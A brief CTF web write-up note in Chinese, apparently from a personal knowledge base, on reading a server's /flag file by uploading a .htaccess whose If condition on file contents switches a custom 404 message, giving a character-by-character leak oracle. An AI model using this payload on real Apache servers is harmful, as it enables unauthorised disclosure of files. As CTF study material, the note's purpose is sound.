tags:: [[CTFWEB/PHP/htaccess]]

- # WP
	-
	- 利用上传[`.htaccess`]([[CTFWEB/PHP/htaccess]])读flag文件
	- .htaccess的内容
		- ```
		  <If 'file("/flag") > "CONTENT"'>
		  ErrorDocument 404 "x_x"
		  </If>
		  ```
	-